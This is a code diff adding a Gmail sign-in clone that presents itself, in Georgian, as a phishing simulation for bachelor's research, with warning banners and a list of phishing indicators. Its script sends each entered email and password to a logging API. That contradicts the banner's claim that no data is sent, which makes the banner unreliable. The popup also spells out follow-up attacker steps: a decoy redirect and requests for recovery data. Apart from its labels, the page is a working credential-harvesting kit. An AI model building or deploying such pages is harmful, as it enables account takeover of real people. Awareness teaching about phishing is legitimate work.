@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="ka">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Gmail – DEMO</title>
+<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --google-blue: #1a73e8;
+    --google-blue-dark: #1557b0;
+    --google-red: #ea4335;
+    --google-border: #dadce0;
+    --google-text: #202124;
+    --google-sub: #5f6368;
+    --warning-red: #c0392b;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+    background: #fff;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+
+  /* ─── WARNING BANNER ─── */
+  .warning-banner {
+    width: 100%;
+    background: var(--warning-red);
+    color: #fff;
+    text-align: center;
+    padding: 10px 16px;
+    font-size: 12px;
+    font-weight: bold;
+    position: sticky;
+    top: 0;
+    z-index: 9999;
+    line-height: 1.5;
+  }
+
+  /* ─── INDICATORS ─── */
+  .indicators {
+    width: 100%;
+    max-width: 500px;
+    margin: 14px auto 0;
+    background: #fff3cd;
+    border: 2px solid #ffc107;
+    border-radius: 10px;
+    padding: 12px 16px;
+  }
+  .indicators h3 { color: #856404; font-size: 12px; margin-bottom: 6px; }
+  .indicators ul  { color: #533f03; font-size: 11px; padding-left: 16px; line-height: 1.8; }
+
+  /* ─── FAKE URL BAR ─── */
+  .url-bar {
+    width: 100%; max-width: 500px;
+    background: #2d2d2d; color: #aaa;
+    font-size: 11px; padding: 7px 14px;
+    display: flex; align-items: center; gap: 6px;
+    font-family: monospace;
+    border-radius: 8px 8px 0 0; margin-top: 10px;
+  }
+  .url-bar .fake { color: #e74c3c; word-break: break-all; }
+  .url-bar .real { color: #27ae60; }
+
+  /* ─── MAIN CARD ─── */
+  .card {
+    width: 100%; max-width: 500px;
+    border-radius: 0 0 12px 12px;
+    border: 1px solid var(--google-border);
+    border-top: none;
+    padding: 36px 40px 40px;
+    margin-bottom: 32px;
+  }
+
+  /* ─── GOOGLE LOGO ─── */
+  .google-logo {
+    text-align: center;
+    margin-bottom: 24px;
+  }
+  .google-logo svg { width: 74px; }
+
+  /* ─── STEP 1: Email ─── */
+  .step { display: none; }
+  .step.active { display: block; }
+
+  .step h1 {
+    font-size: 24px;
+    color: var(--google-text);
+    font-weight: 400;
+    margin-bottom: 8px;
+    text-align: center;
+  }
+  .step .subtitle {
+    font-size: 15px;
+    color: var(--google-sub);
+    text-align: center;
+    margin-bottom: 28px;
+  }
+
+  /* ─── AVATAR (step 2) ─── */
+  .avatar-row {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    border: 1px solid var(--google-border);
+    border-radius: 24px;
+    padding: 8px 14px;
+    margin-bottom: 28px;
+    cursor: pointer;
+    width: fit-content;
+    margin-left: auto; margin-right: auto;
+  }
+  .avatar-circle {
+    width: 36px; height: 36px;
+    background: var(--google-blue);
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    color: #fff; font-size: 16px; font-weight: 500;
+  }
+  .avatar-row span { font-size: 14px; color: var(--google-text); }
+  .avatar-row .chevron { color: var(--google-sub); font-size: 12px; }
+
+  /* ─── INPUT ─── */
+  .input-wrap {
+    position: relative;
+    margin-bottom: 6px;
+  }
+  .input-wrap input {
+    width: 100%;
+    padding: 13px 14px;
+    border: 1px solid var(--google-border);
+    border-radius: 4px;
+    font-size: 16px;
+    color: var(--google-text);
+    outline: none;
+    font-family: inherit;
+    transition: border-color .15s;
+    -webkit-appearance: none;
+  }
+  .input-wrap input:focus {
+    border-color: var(--google-blue);
+    border-width: 2px;
+    padding: 12px 13px;
+  }
+  .input-wrap label {
+    position: absolute;
+    left: 14px; top: 50%;
+    transform: translateY(-50%);
+    font-size: 16px;
+    color: var(--google-sub);
+    pointer-events: none;
+    transition: all .15s;
+    background: #fff;
+    padding: 0 2px;
+  }
+  .input-wrap input:focus + label,
+  .input-wrap input:not(:placeholder-shown) + label {
+    top: 0; font-size: 12px;
+    color: var(--google-blue);
+  }
+
+  .helper-text {
+    font-size: 12px;
+    color: var(--google-sub);
+    margin-bottom: 28px;
+    line-height: 1.5;
+  }
+
+  /* ─── BUTTONS ─── */
+  .btn-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-top: 28px;
+  }
+  .btn-text {
+    color: var(--google-blue);
+    font-size: 14px; font-weight: 500;
+    background: none; border: none;
+    cursor: pointer; padding: 8px 10px;
+    border-radius: 4px;
+    font-family: inherit;
+  }
+  .btn-text:hover { background: #e8f0fe; }
+
+  .btn-next {
+    background: var(--google-blue);
+    color: #fff; border: none;
+    border-radius: 4px;
+    padding: 10px 24px;
+    font-size: 14px; font-weight: 500;
+    cursor: pointer;
+    font-family: inherit;
+    transition: background .15s;
+    -webkit-tap-highlight-color: transparent;
+  }
+  .btn-next:hover  { background: var(--google-blue-dark); }
+  .btn-next:active { background: #0d47a1; }
+
+  /* ─── SHOW PASSWORD TOGGLE ─── */
+  .show-pw {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin: 16px 0 0;
+    cursor: pointer;
+    width: fit-content;
+  }
+  .show-pw input[type="checkbox"] { accent-color: var(--google-blue); width: 16px; height: 16px; }
+  .show-pw span { font-size: 14px; color: var(--google-text); }
+
+  /* ─── FORGOT ─── */
+  .forgot-link {
+    color: var(--google-blue);
+    font-size: 14px;
+    font-weight: 500;
+    text-decoration: none;
+    display: block;
+    margin-top: 20px;
+  }
+
+  /* ─── DIVIDER ─── */
+  .divider {
+    border: none; border-top: 1px solid var(--google-border);
+    margin: 28px 0;
+  }
+
+  /* ─── CREATE ACCOUNT ─── */
+  .create-btn {
+    display: block;
+    width: 100%;
+    padding: 10px;
+    border: 1px solid var(--google-border);
+    border-radius: 4px;
+    background: #fff;
+    color: var(--google-blue);
+    font-size: 14px; font-weight: 500;
+    text-align: center;
+    cursor: pointer;
+    font-family: inherit;
+  }
+
+  /* ─── FOOTER ─── */
+  .page-footer {
+    width: 100%; max-width: 500px;
+    display: flex;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 8px;
+    padding: 0 16px 24px;
+    font-size: 12px;
+    color: var(--google-sub);
+  }
+  .page-footer a { color: var(--google-sub); text-decoration: none; }
+  .page-footer a:hover { text-decoration: underline; }
+
+  /* ─── OVERLAY / POPUP ─── */
+  .overlay {
+    display: none; position: fixed; inset: 0;
+    background: rgba(0,0,0,0.65);
+    z-index: 8888; align-items: center; justify-content: center;
+    padding: 16px;
+  }
+  .overlay.show { display: flex; }
+  .popup {
+    background: #fff; border-radius: 14px;
+    padding: 30px 28px; max-width: 440px; width: 100%;
+    text-align: center;
+  }
+  .popup .icon { font-size: 50px; margin-bottom: 12px; }
+  .popup h2 { font-size: 18px; color: var(--google-text); margin-bottom: 8px; }
+  .popup p { font-size: 13px; color: #555; line-height: 1.7; margin-bottom: 14px; }
+  .captured {
+    background: #fff3cd; border: 1px solid #ffc107;
+    border-radius: 8px; padding: 14px; margin-bottom: 14px;
+    font-size: 12px; color: #856404; text-align: left;
+  }
+  .captured strong { display: block; font-size: 10px; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px; }
+  .popup .close-btn {
+    background: var(--warning-red); color: #fff; border: none;
+    border-radius: 8px; padding: 12px 28px;
+    font-size: 14px; font-weight: 600; cursor: pointer;
+    width: 100%; font-family: inherit;
+  }
+
+  @media (max-width: 500px) {
+    .card { padding: 28px 20px 32px; border-left: none; border-right: none; border-radius: 0; }
+    .indicators, .url-bar { border-radius: 0; }
+  }
+</style>
+</head>
+<body>
+
+<!-- WARNING -->
+<div class="warning-banner">
+  ⚠️ სასწავლო/სადემონსტრაციო ფიშინგ სიმულაცია — საბაკალავრო კვლევა. მონაცემები არ იგზავნება.
+</div>
+
+<!-- INDICATORS -->
+<div class="indicators">
+  <h3>🔍 ფიშინგის ინდიკატორები:</h3>
+  <ul>
+    <li><strong>URL:</strong> რეალური: <code>accounts.google.com</code> — ყალბი: <code>accounts.g00gle-verify.com</code></li>
+    <li><strong>2-step flow:</strong> ჯერ email (username harvesting), შემდეგ password — ზუსტი Google UX კლონი</li>
+    <li><strong>Credential Stuffing:</strong> მოპარული email+password ავტომატურად ტესტდება სხვა სერვისებზე</li>
+    <li><strong>Recovery codes:</strong> მოწინავე ვარიანტებში recovery code-საც ითხოვენ 2FA-ს გვერდის ასავლელად</li>
+  </ul>
+</div>
+
+<!-- FAKE URL BAR -->
+<div class="url-bar">
+  🔒 <span class="fake">accounts.g00gle-verify.com/signin/v2/identifier</span>
+  <span style="margin-left:auto;color:#555;font-size:10px">რეალური: <span class="real">accounts.google.com</span></span>
+</div>
+
+<!-- MAIN CARD -->
+<div class="card">
+
+  <!-- GOOGLE SVG LOGO -->
+  <div class="google-logo">
+    <svg viewBox="0 0 74 24" xmlns="http://www.w3.org/2000/svg" aria-label="Google">
+      <path d="M9.24 8.19v2.46h5.88c-.18 1.38-.64 2.39-1.34 3.1-.86.86-2.2 1.8-4.54 1.8-3.62 0-6.45-2.92-6.45-6.54s2.83-6.54 6.45-6.54c1.95 0 3.38.77 4.43 1.76L15.4 2.5C13.94 1.08 11.98 0 9.24 0 4.28 0 .11 4.04.11 9s4.17 9 9.13 9c2.68 0 4.7-.88 6.28-2.52 1.62-1.62 2.13-3.91 2.13-5.75 0-.57-.04-1.1-.13-1.54H9.24z" fill="#4285F4"/>
+      <path d="M25 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z" fill="#EA4335"/>
+      <path d="M53.58 7.49h-.09c-.57-.68-1.67-1.3-3.06-1.3C47.53 6.19 45 8.72 45 12c0 3.26 2.53 5.81 5.43 5.81 1.39 0 2.49-.62 3.06-1.32h.09v.81c0 2.22-1.19 3.41-3.1 3.41-1.56 0-2.53-1.11-2.93-2.05l-2.22.92c.64 1.54 2.33 3.41 5.15 3.41 2.99 0 5.52-1.76 5.52-6.05V6.49h-2.42v1zm-2.93 8.03c-1.76 0-3.1-1.5-3.1-3.52 0-2.05 1.34-3.52 3.1-3.52 1.74 0 3.1 1.49 3.1 3.54.01 2.03-1.36 3.5-3.1 3.5z" fill="#4285F4"/>
+      <path d="M38 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z" fill="#FBBC05"/>
+      <path d="M58.89 1h2.55v16.81h-2.55z" fill="#34A853"/>
+      <path d="M63.69 12.2c-.06-3.56 2.76-5.97 5.9-5.97 1.95 0 3.28.84 4.07 1.85l-1.77 1.46c-.49-.68-1.32-1.18-2.32-1.18-1.74 0-3.21 1.38-3.33 3.34h7.39c.07.32.11.66.11 1.03 0 3.17-2.06 5.96-5.44 5.96-3.22.01-4.61-2.55-4.61-6.49zm7.83-.96h-4.68c.3-1.45 1.24-2.32 2.49-2.32 1.17 0 1.98.73 2.19 2.32z" fill="#EA4335"/>
+    </svg>
+  </div>
+
+  <!-- STEP 1: EMAIL -->
+  <div class="step active" id="step1">
+    <h1>შესვლა</h1>
+    <p class="subtitle">გამოიყენეთ თქვენი Google ანგარიში</p>
+
+    <div class="input-wrap">
+      <input type="email" id="email" placeholder=" " autocomplete="off" autocorrect="off" autocapitalize="off" inputmode="email">
+      <label>ელ-ფოსტა ან ტელეფონი</label>
+    </div>
+    <p class="helper-text">ელ-ფოსტა დამახსოვრდეს?</p>
+
+    <div class="btn-row">
+      <button class="btn-text" onclick="goCreate()">ანგარიშის შექმნა</button>
+      <button class="btn-next" onclick="goStep2()">შემდეგი</button>
+    </div>
+  </div>
+
+  <!-- STEP 2: PASSWORD -->
+  <div class="step" id="step2">
+    <h1>მოგესალმებით</h1>
+
+    <div class="avatar-row" onclick="goStep1()">
+      <div class="avatar-circle" id="avatar-letter">G</div>
+      <span id="avatar-email">user@gmail.com</span>
+      <span class="chevron">▾</span>
+    </div>
+
+    <div class="input-wrap">
+      <input type="password" id="password" placeholder=" ">
+      <label>პაროლი შეიყვანეთ</label>
+    </div>
+
+    <label class="show-pw">
+      <input type="checkbox" onchange="togglePw(this)">
+      <span>პაროლის ჩვენება</span>
+    </label>
+
+    <a href="#" class="forgot-link">პაროლი დაგავიწყდათ?</a>
+
+    <div class="btn-row" style="margin-top: 32px;">
+      <button class="btn-text" onclick="goStep1()">უკან</button>
+      <button class="btn-next" onclick="submitForm()">შემდეგი</button>
+    </div>
+  </div>
+
+  <hr class="divider">
+  <button class="create-btn">ახალი ანგარიშის შექმნა</button>
+</div>
+
+<!-- FOOTER LINKS -->
+<div class="page-footer">
+  <div>
+    <a href="#">ქართული</a>
+  </div>
+  <div style="display:flex;gap:16px">
+    <a href="#">დახმარება</a>
+    <a href="#">კონფიდენციალობა</a>
+    <a href="#">პირობები</a>
+  </div>
+</div>
+
+<!-- CAPTURE POPUP -->
+<div class="overlay" id="overlay">
+  <div class="popup">
+    <div class="icon">🎣</div>
+    <h2>ფიშინგის სიმულაცია!</h2>
+    <p>Google-ის ფიშინგი განსაკუთრებით სახიფათოა — Gmail-ზე წვდომა ნიშნავს <strong>ყველა სერვისის</strong> კომპრომეტირებას (Drive, Pay, Photos, ყველა linked ანგარიში).</p>
+    <div class="captured">
+      <strong>⚠️ "ჩაჭერილი" მონაცემები (სიმულაცია):</strong>
+      <div id="captured-data"></div>
+    </div>
+    <p style="font-size:11px;color:#888;margin-bottom:14px;">
+      შემდეგი ნაბიჯი: redirect to <strong>google.com</strong> with "wrong password" — მსხვერპლი ეჭვს ვერ ეპარება. 
+      Account Recovery email-საც ხშირად ითხოვენ — მთლიანი Google account გადადის.
+    </p>
+    <button class="close-btn" onclick="document.getElementById('overlay').classList.remove('show')">გასაგებია, დახურვა</button>
+  </div>
+</div>
+
+<script>
+  let capturedEmail = '';
+
+  function goStep1() {
+    document.getElementById('step1').classList.add('active');
+    document.getElementById('step2').classList.remove('active');
+  }
+
+  function goStep2() {
+    const email = document.getElementById('email').value.trim();
+    if (!email) { document.getElementById('email').focus(); return; }
+    capturedEmail = email;
+    const letter = email[0].toUpperCase();
+    document.getElementById('avatar-letter').textContent = letter;
+    document.getElementById('avatar-email').textContent = email;
+    document.getElementById('step1').classList.remove('active');
+    document.getElementById('step2').classList.add('active');
+    document.getElementById('password').focus();
+  }
+
+  function goCreate() { alert('სიმულაციის ფარგლებში — ეს ღილაკი არ მუშაობს'); }
+
+  function togglePw(cb) {
+    const pw = document.getElementById('password');
+    pw.type = cb.checked ? 'text' : 'password';
+  }
+
+  function submitForm() {
+  const email = capturedEmail;
+  const password = document.getElementById('password').value;
+
+  fetch("https://localhost:7011/api/log", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      type: "Gmail",
+      email: email,
+      password: password
+    })
+  });
+
+  document.getElementById('captured-data').innerHTML =
+    `📌 Type: <strong>${"Gmail"}</strong><br>
+   📧 Email: <strong>${email}</strong><br>
+   🔑 Password: <strong>${password}</strong><br>
+   🌍 System data (demo)`;
+  document.getElementById('overlay').classList.add('show');
+}
+  // Enter key support
+  document.getElementById('email').addEventListener('keydown', e => { if(e.key==='Enter') goStep2(); });
+  document.getElementById('password').addEventListener('keydown', e => { if(e.key==='Enter') submitForm(); });
+</script>
+</body>
+</html>
